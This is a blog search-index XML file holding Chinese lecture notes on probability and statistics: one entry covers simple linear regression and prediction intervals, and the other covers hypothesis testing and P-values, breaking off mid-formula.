<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>概率论与数理统计 笔记8</title>
      <link href="/53/"/>
      <url>/53/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-8-线性回归"><a href="#Chap-8-线性回归" class="headerlink" title="Chap 8 线性回归"></a>Chap 8 线性回归</h1><h2 id="回归问题"><a href="#回归问题" class="headerlink" title="回归问题"></a>回归问题</h2><ul><li><p><strong>定义</strong><br>  $$<br>  Y=f(X_1,\cdots,X_n)+\varepsilon.<br>  $$</p><ul><li>$Y$ — 因变量(响应变量).</li><li>$X_1,\cdots,X_n$ — 自变量(回归变量).</li><li>$\varepsilon$ — 随机误差(无法测量或不重要的因素).</li></ul><p>  假定 $E(\varepsilon\mid X_1,\cdots,X_n)=0$,<br>  $$<br>  \Rightarrow E(Y\mid X_1,\cdots,X_n)=f(X_1,\cdots,X_n).<br>  $$<br>  称为 $Y$ 对 $X_1,\cdots,X_n$ 的回归函数. 由样本数据 $X_1,\cdots,X_n,Y$ 获取 $f$ 的过程称为回归(有监督学习).</p></li><li><p><strong>注</strong>  </p><ul><li>$X_1,\cdots,X_n$ 可以是随机的(<strong>e.g.</strong> 随机抽取一人的身高、体重等).</li><li>$X_1,\cdots,X_n$ 也可以是非随机的控制变量(<strong>e.g.</strong> 施肥量、药品使用剂量).</li><li>在应用中, 自变量一律视为非随机的.</li></ul></li><li><p><strong>假设</strong>  $E(\varepsilon)=0$, $Var(\varepsilon)=\sigma^2$ (未知).</p></li><li><p><strong>注</strong>  要素是否完全、$f$ 的形式是否准确关乎 $\sigma^2$ 的大小.</p></li></ul><h2 id="简单线性回归"><a href="#简单线性回归" class="headerlink" title="简单线性回归"></a>简单线性回归</h2><ul><li><p><strong>定义</strong><br>  $$<br>  Y=\beta_0+\beta_1 X+\varepsilon.<br>  $$<br>  这是<strong>理论模型</strong>, 提供背景作用. 其中回归参数(未知待定):</p><ul><li>$\beta_0$ — 截距.</li><li>$\beta_1$ — 斜率(回归系数).</li></ul><p>  对 $(X,Y)$ 进行 $n$ 次独立观测, 得到样本观测值 $(x_1,y_1),\cdots,(x_n,y_n)$. 则<br>  $$<br>  y_i=\beta_0+\beta_1 x_i+\varepsilon_i,(1\le i\le n).<br>  $$<br>  其中 $\varepsilon_i$ 作为第 $i$ 次观测的随机误差, 无法直接观测得到. 不妨认为<br>  $$<br>  \begin{cases}<br>  E(\varepsilon_i)=0,\<br>  \<br>  Var(\varepsilon_i)=\sigma^2.<br>  \end{cases}<br>  $$<br>  这是<strong>简单线性回归模型</strong>. 其中:</p><ul><li>$E(y_i)=\beta_0+\beta_1 x_i$.</li><li>$Var(y_i)=\sigma^2$.</li></ul></li><li><p><strong>注</strong></p><ul><li><strong>简单</strong>: $n=1$.</li><li><strong>线性</strong>: $f$ 关于参数 $\beta_0$, $\beta_1$ 线性.</li></ul></li></ul><h2 id="最小二乘法-LS-估计参数"><a href="#最小二乘法-LS-估计参数" class="headerlink" title="最小二乘法 (LS) 估计参数"></a>最小二乘法 (LS) 估计参数</h2><ul><li><p><strong>定义</strong><br>  $$<br>  S(\beta_0,\beta_1)=\sum_{i=1}^{n}(y_i-(\beta_0+\beta_1 x_i))^2.<br>  $$<br>  最小化 $S(\beta_0,\beta_1)$, 得</p><ul><li>$\hat\beta_1=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})(y_i-\overline{y})}{\sum\limits_{i=1}^{n}(x_i-\overline{x})^2}=\dfrac{\sum\limits_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}$ ($y_i$ 的线性组合).</li><li>$\hat\beta_0=\overline{y}-\hat\beta_1\overline{x}=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i$ ($y_i$ 的线性组合).</li><li>$y=\hat\beta_0+\hat\beta_1 x$ (拟合直线).</li></ul></li><li><p><strong>注</strong></p><ul><li>损失函数: $(y-(\beta_0+\beta_1 x))^2$.</li><li>线性模型是否合理.</li></ul></li><li><p><strong>命题</strong>  $\hat\beta_0$, $\hat\beta_1$ 分别为 $\beta_0$, $\beta_1$ 的无偏估计.</p></li><li><p><strong>证明</strong><br>  $$<br>  \begin{aligned}<br>  E(\hat\beta_1)&amp;=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})E(y_i)}{S_{xx}}\<br>  &amp;=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})(\beta_0+\beta_1 x_i)}{S_{xx}}\<br>  &amp;=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})x_i}{S_{xx}}\<br>  &amp;=\beta_1\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}}\<br>  &amp;=\beta_1.<br>  \end{aligned}<br>  $$</p><p>  $$<br>  \begin{aligned}<br>  E(\hat\beta_0)&amp;=E(\overline{y}-\hat\beta_1\overline{x})\<br>  &amp;=\dfrac{1}{n}\sum_{i=1}^{n}E(y_i)-E(\hat\beta_1)\overline{x}\<br>  &amp;=\dfrac{1}{n}\sum_{i=1}^{n}(\beta_0+\beta_1 x_i)-\beta_1\overline{x}\<br>  &amp;=\beta_0.<br>  \end{aligned}<br>  $$</p><p>  $$<br>  \begin{aligned}<br>  Var(\hat\beta_1)&amp;=Var\Big(\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})y_i}{S_{xx}}\Big)\<br>  &amp;=\dfrac{\sum_{i=1}^{n}(x_i-\overline{x})^2}{S_{xx}^2}Var(y_i)\<br>  &amp;=\dfrac{\sigma^2}{S_{xx}}.<br>  \end{aligned}<br>  $$</p><p>  $$<br>  \begin{aligned}<br>  Var(\hat\beta_0)&amp;=Var\Big(\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})y_i\Big)\<br>  &amp;=\sum\limits_{i=1}^{n}(\dfrac{1}{n}-\dfrac{(x_i-\overline{x})\overline{x}}{S_{xx}})^2 Var(y_i)\<br>  &amp;=(\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}})\sigma^2\<br>  &amp;=\dfrac{\sigma^2}{S_{xx}}\cdot\dfrac{\sum_{i=1}^{n}x_i^2}{n}.<br>  \end{aligned}<br>  $$</p></li><li><p><strong>注</strong>  中心化处理:<br>  $$<br>  y_i=\beta_0+\beta_1\overline{x}+\beta_1(x_i-\overline{x})+\varepsilon_i.<br>  $$<br>  此时常数项 $\beta_0+\beta_1\overline{x}$ 的估计 $=\hat\beta_0+\hat\beta_1\overline{x}=\overline{y}$.</p></li><li><p><strong>定义(残差)</strong>  当 $X=x_i$ 时, 拟合直线上相应点为 $(x_i,\hat\beta_0+\hat\beta_1 x_i)$.</p><p>  记 $\hat{y}<em>i=\hat\beta_0+\hat\beta_1 x_i$, 称为 $x_i$ 处的拟合值. 定义残差 $y_i-\hat{y}<em>i$. 考虑残差平方和<br>  $$<br>  SSE:=\sum</em>{i=1}^{n}(y_i-\hat y_i)^2=\sum</em>{i=1}^{n}(y_i-(\hat\beta_0+\hat\beta_1 x_i))^2.<br>  $$</p></li><li><p><strong>命题</strong>  $\hat\sigma^2:=\dfrac{SSE}{n-2}$ 为 $\sigma^2$ 的无偏估计. 此时</p><ul><li>$\hat{se}(\hat\beta_1)=\dfrac{\hat\sigma}{\sqrt{S_{xx}}}$.</li><li>$\hat{se}(\hat\beta_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{\overline{x}^2}{S_{xx}}}$.</li></ul></li></ul><h2 id="回归参数推断"><a href="#回归参数推断" class="headerlink" title="回归参数推断"></a>回归参数推断</h2><ul><li><p><strong>追加假设</strong>  $\varepsilon_i\sim N(0,\sigma^2)$, $1\le i\le n$.</p></li><li><p><strong>注</strong></p><ul><li><p>$y_i\sim N(\beta_0+\beta_1 x_i,\sigma^2)$ 独立, $1\le i\le n$.</p></li><li><p><strong>MLE</strong>$(\beta_0^*,\beta_1^*)=(\hat\beta_0,\hat\beta_1)$ (<strong>习题课 5</strong>).</p><p>  $L(\beta_0,\beta_1,\sigma^2)=\prod\limits_{i=1}^{n}\dfrac{1}{\sqrt{2\pi}\sigma}e^{-\tfrac{(y_i-(\beta_0+\beta_1 x_i))^2}{2\sigma^2}}$.</p><p>  $(\sigma^2)^*=\dfrac{SSE}{n}$.</p></li></ul></li><li><p><strong>定义(假设检验)</strong>  $H_0:\beta_1=0$ <strong>v.s.</strong> $H_1:\beta_1\ne 0$. 因为 $\hat\beta_1$ 为 $y_i$ 的线性组合. 得到<br>  $$<br>  \dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}\sim N(0,1)<br>  $$<br>  可证明<br>  $$<br>  \dfrac{SSE}{\sigma^2}=\dfrac{(n-2)\hat\sigma^2}{\sigma^2}\sim\chi^2(n-2).<br>  $$<br>  从而<br>  $$<br>  \dfrac{\hat\beta_1-\beta_1}{\hat{se}(\hat\beta_1)}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\hat\sigma}{\sqrt{S_{xx}}}}=\dfrac{\hat\beta_1-\beta_1}{\tfrac{\sigma}{\sqrt{S_{xx}}}}/\sqrt{\dfrac{(n-2)\hat\sigma^2}{(n-2)\sigma^2}}\sim t(n-2).<br>  $$<br>  检验统计量:<br>  $$<br>  T=\dfrac{\hat\beta_1}{\hat{se}(\hat\beta_1)}.<br>  $$<br>  当 $H_0$ 为真时, $T\sim t(n-2)$. 检验准则为: 当 $\vert T\vert\ge t_{\tfrac{\alpha}{2}}(n-2)$ 时拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li>可以对其他的 $\beta_1$ 可能值进行检验.</li><li>可以对 $\beta_1$ 进行区间估计.</li><li>可以对 $\beta_0$ 进行相应推断, 过程类似.</li></ul></li></ul><h2 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h2><ul><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 令<br>  $$<br>  \mu_0=E(y_0)=\beta_0+\beta_1 x_0,<br>  $$<br>  给出对 $\mu_0$ 的预测.</p></li><li><p><strong>解答</strong>  用拟合直线上 $x_0$ 处的取值 $\hat y_0$ 给出 $\mu_0$ 的点估计:<br>  $$<br>  \hat y_0=\hat\beta_0+\hat\beta_1x_0=\overline{y}-\hat\beta_1(x_0-\overline{x})=\sum_{i=1}^{n}(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}})y_i<br>  $$<br>  分别给出</p><ul><li>$E(\hat y_0)=E(\hat\beta_0+\hat\beta_1x_0)=\beta_0+\beta_1x_0=\mu_0$.</li><li>$Var(\hat y_0)=\sum_{i=1}^{n}\Big(\dfrac{1}{n}+\dfrac{(x_i-\overline{x})(x_0-\overline{x})}{S_{xx}}\Big)^2\sigma^2=\Big(\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}\Big)\sigma^2$.</li></ul><p>  从而<br>  $$<br>  \dfrac{\hat y_0-\mu_0}{se(\hat y_0)}\sim N(0,1).<br>  $$<br>  使用 $\hat{se}(\hat y_0)=\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}$ 估计 $se(\hat y_0)$, 我们有<br>  $$<br>  \dfrac{\hat y_0-\mu_0}{\hat{se}(\hat y_0)}\sim t(n-2).<br>  $$<br>  从而 $\mu_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为<br>  $$<br>  \Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).<br>  $$</p></li><li><p><strong>例</strong>  当 $X=x_0$ 时, $y_0=\beta_0+\beta_1 x_0+\varepsilon_0$, 其中 $\varepsilon\sim N(0,\sigma^2)$. 给出对 $y_0$ 的预测.</p></li><li><p><strong>解答</strong>  $y_0\sim N(\mu_0,\sigma^2)$. 若 $\mu_0$ 已知, 则 $y_0$ 的(均方意义下最优)估计为 $\mu_0$.</p><p>  一般情况下, $y_0$ 的良好点估计为 $\hat y_0=\hat\beta_0+\hat\beta_1x_0$.</p><p>  注意到 $y_0$ 与 $\hat y_0$ 相互独立, 从而 $\hat y_0- y_0$ 服从正态分布.</p><p>  分别给出</p><ul><li>$E(\hat y_0-y_0)=E(\hat y_0)-E(y_0)=\mu_0-\mu_0=0$.</li><li>$Var(\hat y_0-y_0)=Var(\hat y_0)+Var(y_0)=\sigma^2(1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}})$.</li></ul><p>  从而<br>  $$<br>  \dfrac{\hat y_0-y_0}{\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim N(0,1).<br>  $$<br>  进而<br>  $$<br>  \dfrac{\hat y_0-y_0}{\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}}\sim t(n-2).<br>  $$</p><p>  从而 $y_0$ 的 $(1-\alpha)-$ 置信的双侧区间估计为<br>  $$<br>  \Big(\hat y_0-t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}},\hat y_0+t_{\tfrac{\alpha}{2}}\hat\sigma\sqrt{1+\dfrac{1}{n}+\dfrac{(x_0-\overline{x})^2}{S_{xx}}}\Big).<br>  $$  </p></li><li><p><strong>注</strong>  当 $x_0$ 与 $\overline{x}$ 距离增加时, 估计误差增大.</p></li><li><p><strong>注</strong></p><ul><li>结合实际理解 $\beta$.</li><li>外推需谨慎.</li><li>截距为 0 的回归复杂度 $n-2\rightarrow n-1$.</li><li>回归方程不可逆转使用.</li><li>常见应用:<ul><li>描述趋势.</li><li>预测均值\取值.</li><li>实验控制.</li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Math </category>
          
          <category> Probability Theory </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Probability Theory </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>概率论与数理统计 笔记7</title>
      <link href="/52/"/>
      <url>/52/</url>
      
        <content type="html"><![CDATA[<h1 id="Chap-7-假设检验"><a href="#Chap-7-假设检验" class="headerlink" title="Chap 7 假设检验"></a>Chap 7 假设检验</h1><h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><ul><li><p><strong>例(女士品茶)</strong>  某女士声称可区分奶茶是先加牛奶还是先加茶. <strong>R.Fisher</strong> 设计实验: 各有 4 杯奶茶随机排成一排, 将这一信息告知女士. 考虑假设 $H$: 该女士没有区分能力. 当 $H$ 正确的情况下, 4 杯全对的概率为<br>  $$<br>  \dfrac{C_4^4\cdot C_4^0}{C_8^4}=\dfrac{1}{70}.<br>  $$<br>  下述两种情况之一必发生:</p><ul><li>$H$ 不正确 (**i.e.**该女士有区分能力);</li><li>$H$ 正确 (发生了一件概率为 $\dfrac{1}{70}$ 的事情).</li></ul><p>  通常选择阈值 $\alpha=0.05,0.01,0.1$ (预先给定的显著性水平). 若女士选对了三杯, 则在 $H$ 正确的前提下, 挑对三杯及以上的概率为<br>  $$<br>  \dfrac{C_4^4\cdot C_4^0}{C_8^4}+\dfrac{C_4^3\cdot C_4^1}{C_8^4}=\dfrac{17}{70}\approx 0.243.<br>  $$</p></li><li><p><strong>注</strong></p><ul><li><p><strong>Fisher</strong> 显著性检验;</p></li><li><p>若认可某组观测(样本), 则用它来证实或证伪某个理论(断言)具有天然的不对等;</p></li><li><p>$H$ 可以模型化:<br>  $$<br>  P(X=k)\dfrac{C_4^k\cdot C_4^{4-k}}{C_8^4}.<br>  $$</p></li><li><p>历史注记:</p><ul><li><strong>Fisher</strong> 显著性检验;</li><li><strong>Neyman-Pearson</strong> 检验;</li><li>零假设显著性检验 (<strong>MHST</strong>).</li></ul></li></ul></li><li><p><strong>定义(统计假设)</strong>  对一个或多个总体的某种断言或猜测.</p><ul><li>原假设: 被检验的假设 $H_0$;</li><li>备择假设: 拒绝 $H_0$ 后可供选择的假设 $H_1$.</li><li>若假设可表为参数形式, 那么 $H_0: \theta\in\Theta_0$, $H_1: \theta\in\Theta_1$, 且 $\Theta_0\cap\Theta_1=\varnothing$, $\Theta_0\cup\Theta_1=\theta$ 的所有可能取值之集.</li></ul></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知.</p><ul><li>$H_0:\mu=\mu_0,\quad H_1:\mu\ne\mu_0$. (双侧假设)</li><li>$H_0:\mu=\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu\le\mu_0,\quad H_1:\mu&gt;\mu_0$. (单侧假设)</li><li>$H_0:\mu_1=\mu_2,\quad H_1:\mu_1\ne\mu_2$. (双侧假设)</li></ul></li><li><p><strong>注</strong></p><ul><li>简单假设: 只对应一个总体;</li><li>复合假设: 对应多个总体;</li><li>若 $\sigma^2$ 未知, 则 $H_0: \mu=\mu_0\Leftrightarrow H_0: \mu=\mu_0,\sigma^2$ 任意, 是一个复合假设.</li></ul></li><li><p><strong>定义(假设检验)</strong>  依据样本(观测)的决策(拒绝或不拒绝 $H_0$)过程.</p></li><li><p><strong>定义(检验准则)</strong>  做出决策的一个具体法则.</p></li><li><p><strong>定义(拒绝)</strong>  在原假设 $H_0$ 为真的前提下, 所观测的样本出现的概率如果是很小的, 意味着样本提供的概率拒绝 $H_0$.</p></li><li><p><strong>定义(拒绝域/临界域)</strong>  形式上可抽象为<br>  $$<br>  R={(X_1,\cdots,X_n)\mid T(X_1,\cdots,X_n)\ge c}.<br>  $$<br>  其中 $c$ 被定义为临界值. 此时检验准则为, 若样本 $(X_1,\cdots,X_n)\in R$, 则拒绝假设 $H_0$.</p></li><li><p><strong>定义(显著性检验)</strong>  对事先给定的 $\alpha\in(0,1)$, 若 $P_{\theta}(T(X_1,\cdots,X_n)\ge c)\le\alpha$, $\forall,\theta\in\Theta_0$, 则称这是一个水平为 $\alpha$ 的显著性检验.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为双侧拒绝, 当 $H_0$ 为真时, 控制 $P(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha$. </p><p>  根据 <strong>CLT</strong>, 注意到<br>  $$<br>  \overline{X}-\mu_0\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).<br>  $$<br>  取 $\dfrac{c}{\tfrac{\sigma}{\sqrt{n}}}=Z_{\tfrac{\alpha}{2}}\Rightarrow c=\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$. </p><p>  给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\vert\overline{X}-\mu_0\vert\ge\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\tfrac{\alpha}{2}}$, 则拒绝 $H_0$.</p></li><li><p><strong>例</strong>  假设 $X\sim N(\mu,\sigma^2)$, 其中 $\sigma^2$ 已知, 给定检验水平 $\alpha\in(0,1)$ 和已观测样本 $X_i(1\le i\le n)$. $H_0:\mu\ge\mu_0$, $H_1:\mu&lt;\mu_0$. 对原假设进行检验.</p></li><li><p><strong>解答</strong>  拒绝域为单侧拒绝, 当 $H_0$ 为真时, 控制 $P(\overline{X}\le c)\le\alpha$.</p><p>  根据 <strong>CLT</strong>, 注意到<br>  $$<br>  \overline{X}-\mu\sim N(0,\dfrac{\sigma^2}{n})\Leftrightarrow\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\sim N(0,1).<br>  $$<br>  因此<br>  $$<br>  \begin{aligned}<br>  P(\overline{X}\le c)&amp;=P(\dfrac{\overline{X}-\mu}{\tfrac{\sigma}{\sqrt{n}}}\le \dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\<br>  &amp;=P(Z\le\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}})\<br>  &amp;=\varPhi(\dfrac{c-\mu}{\tfrac{\sigma}{\sqrt{n}}}),\forall,\mu\ge\mu_0.<br>  \end{aligned}<br>  $$</p><p>  取 $\dfrac{c-\mu_0}{\tfrac{\sigma}{\sqrt{n}}}=-Z_{\alpha}\Rightarrow c=\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$. </p><p>  给出在 $\alpha$ 的检验水平下拒绝 $H_0$ 的条件: 若 $\overline{X}\le\mu_0-\dfrac{\sigma}{\sqrt{n}}\cdot Z_{\alpha}$, 则拒绝 $H_0$.</p></li><li><p><strong>注</strong></p><ul><li><p>这种方法称为 $Z$-检验.</p></li><li><p>若 $\sigma^2$ 未知, 考虑<br>  $$<br>  \dfrac{\overline{X}-\mu}{\tfrac{S}{\sqrt{n}}}\sim t(n-1).<br>  $$<br>  这种方法称为 $t$-检验.</p></li></ul></li></ul><h2 id="Neyman-Pearson-假设检验"><a href="#Neyman-Pearson-假设检验" class="headerlink" title="Neyman-Pearson 假设检验"></a>Neyman-Pearson 假设检验</h2><ul><li><p><strong>定义(错误)</strong>  Ⅰ类错误: 在 $H_0$ 为真时拒绝 $H_0$; Ⅱ类错误: 在 $H_0$ 为假时不拒绝 $H_0$. 对应的概率分别为:<br>  $$<br>  \begin{aligned}<br>  \alpha(R)&amp;:=P_{\theta}(Ⅰ)=P_{\theta}((X_1,\cdots,X_n)\in R),\theta\in\Theta_0;\<br>  \beta(R)&amp;:=P_{\theta}(Ⅱ)=P_{\theta}((X_1,\cdots,X_n)\in R^c),\theta\in\Theta_1.<br>  \end{aligned}<br>  $$<br>  对于已划分的 $R$ 来说, 是定义域不同的 $\theta$ 的函数.</p></li><li><p><strong>注</strong></p><ul><li>依据样本做决策, 错误不能根本避免;</li><li>一次决策不能同时犯两种错误;</li><li>$n$ 固定, 两种错误发生的概率此消彼长.</li></ul></li><li><p><strong>例(直觉)</strong></p><ul><li>都不拒绝 $H_0$, 那么 $P_{\theta}(Ⅰ)=0$, $P_{\theta}(Ⅱ)=1$.</li><li>考虑事件 $H_0:$ 合格, 事件 $H_1:$ 不合格, 当 $P_{\theta}(Ⅰ)$ 变小时, 不容易拒绝事件, 不合格不容易被检出, 从而 $P_{\theta}(Ⅱ)$ 变大.</li></ul></li><li><p><strong>定义(功效函数)</strong>    给定 $\theta$ 与临界域 $R$, 拒绝原假设 $H_0$ 的概率为:<br>  $$<br>  P_{\theta}((X_1,\cdots,X_n)\in R)=1-\beta(R),,\theta\in\Theta_1.<br>  $$</p></li><li><p><strong>定义(Neyman-Pearson 范式)</strong>  $n$ 固定, 控制 $P_{\theta}(Ⅰ)\le\alpha$, 其中 $\alpha$ 为预先给定的检验水平, 再在这个限制下使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 尽可能小.</p></li><li><p><strong>注</strong></p><ul><li>$\alpha$ 固定时, 使 $P_{\theta}(Ⅱ)(\theta\in\Theta_1)$ 最小的检验称为水平 $\alpha$ 下的一致最优检验;</li><li>原假设 $H_0$ 和备择假设 $H_1$ 一般是地位不对等的:<ul><li>原假设通常是受到保护的, 证据不充分不能拒绝;</li><li>备择假设通常是真正感兴趣的.</li></ul></li><li>一致最优检验不一定存在, 一般也不易求解;</li><li>$\mu_0\in$ 置信区间 $\Leftrightarrow$ 假设检验 $(H_0: \mu=\mu_0, H_1: \mu\ne\mu_0)$ 不拒绝 $H_0$.</li></ul></li></ul><h2 id="假设检验与置信区间"><a href="#假设检验与置信区间" class="headerlink" title="假设检验与置信区间"></a>假设检验与置信区间</h2><ul><li><p><strong>例</strong>  $X\sim N(\mu,\sigma^2)$, $\sigma^2$ 已知, $\alpha&gt;0$ 给定, $X_1,\cdots,X_n$ 为随机样本.</p></li><li><p>**解答 ** 其双侧置信区间为<br>  $$<br>  P=(\overline{X}-Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}},\overline{X}+Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}).<br>  $$<br>  考虑假设检验 $H_0:\mu=\mu_0$, $H_1:\mu\ne\mu_0$. 需要控制<br>  $$<br>  P_{H_0}(\vert\overline{X}-\mu_0\vert\ge c)\le\alpha.<br>  $$<br>  检验准则为 $\vert\overline{X}-\mu_0\vert\ge Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}$ 时拒绝 $H_0$. 我们给出接受域<br>  $$<br>  R^c={(X_1,\cdots,X_n)\mid \vert\overline{X}-\mu_0\vert&lt;Z_{\tfrac{\alpha}{2}}\dfrac{\sigma}{\sqrt{n}}}\<br>  ={(X_1,\cdots,X_n)\mid \mu_0\in P}.<br>  $$<br>  由此可见, $\mu_0\in P\Leftrightarrow$ 用 $\overline{X}$ 为检验统计量, 假设检验不拒绝 $H_0$.(<strong>对偶关系</strong>)</p></li></ul><h2 id="检验的-P-值"><a href="#检验的-P-值" class="headerlink" title="检验的 P 值"></a>检验的 P 值</h2><ul><li><p><strong>定义</strong>  当原假设 $H_0$ 为真时, 检验统计量的观测值以及更极端观测出现的概率. </p></li><li><p><strong>例(选举问题)</strong>  $n=1200$, 调查到的支持比例为 $\tfrac{684}{1200}\approx 0.57$ (观测值).</p></li><li><p><strong>解答</strong>  (1) $H_0:p=p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).<br>  $$<br>  当 $H_0$ 为真时, $p=p_0$, 此时 $se(P_n)=\sqrt{\dfrac{p_0(1-p_0)}{n}}$. 因此 <strong>P</strong> 值<br>  $$<br>  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p_0}{se(P_n)}\ge\dfrac{p_n-p_0}{se(P_n)})\approx P(Z\ge z_0).<br>  $$<br>  其中<br>  $$<br>  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p_0}{se(P_n)}=\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}.<br>  $$<br>  因此<br>  $$<br>  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_0(1-p_0)}{n}}}).<br>  $$<br>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 $\ll 0.001$.</p><p>  在水平 $\alpha$ 下拒绝 $H_0\Leftrightarrow$ <strong>P</strong> 值 $\le\alpha$.</p></li><li><p><strong>注</strong></p><ul><li><strong>P</strong> 值作为数据 (观测) 拒绝 $H_0$ 的证据.</li><li>强弱的度量: <strong>P</strong> 值越小, 拒绝 $H_0$ 的证据越强 (非正式的).</li><li><strong>P</strong> 值 $\ne$ $P(H_0\mid $ 观测$)$.</li><li>若 <strong>P</strong> 值不小, 则不拒绝 $H_0$, 原因可能为 $H_0$ 真 / $H_0$ 不真, 但检验功效不大.</li></ul></li><li><p><strong>定义</strong>  若拒绝 $H_0:\theta\in\Theta_0\Leftrightarrow T(X_1,\cdots,X_n)\ge C$, 则检验的 <strong>P</strong> 值 $:=$<br>  $$<br>  \sup_{\theta\in\Theta_0}P_{\theta}(T(X_1,\cdots,X_n)\ge T(x_1,\cdots,x_n)).<br>  $$<br>  其中 $T(x_1,\cdots,x_n)$ 为检验统计量的观测值.</p></li><li><p><strong>解答</strong>  (2) $H_0:p\le p_0$ v.s. $H_1:p&gt;p_0$ ($p_0$ 预先给定).</p><p>  考虑检验统计量 $P_n$, 则由 <strong>CLT</strong>:<br>  $$<br>  \dfrac{P_n-p}{\sqrt{\tfrac{p(1-p)}{n}}}\stackrel{近似}{\sim}N(0,1).<br>  $$<br>  当 $H_0$ 为真时, 此时 $se(P_n)\approx \hat{se}(P_n)=\sqrt{\dfrac{p_n(1-p_n)}{n}}$. 因此 <strong>P</strong> 值<br>  $$<br>  P_{H_0}(P_n\ge p_n)=P(\dfrac{P_n-p}{\hat{se}(P_n)}\ge\dfrac{p_n-p}{\hat{se}(P_n)})\approx P(Z\ge z_0).<br>  $$<br>  其中<br>  $$<br>  Z\stackrel{近似}{\sim}N(0,1),z_0=\dfrac{p_n-p}{\hat{se}(P_n)}=\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}.<br>  $$<br>  因此<br>  $$<br>  P_{H_0}(P_n\ge p_n)=1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}),\forall,p\le p_0.<br>  $$<br>  因此 <strong>P</strong> 值<br>  $$<br>  \sup_{p\le p_0}\Big(1-\varPhi(\dfrac{p_n-p}{\sqrt{\tfrac{p_n(1-p_n)}{n}}})\Big)=1-\varPhi(\dfrac{p_n-p_0}{\sqrt{\tfrac{p_n(1-p_n)}{n}}}).<br>  $$<br>  若 $p_0=0.55$, 则 <strong>P</strong> 值 $\approx 0.081$; 若 $p_0=0.5$, 则 <strong>P</strong> 值 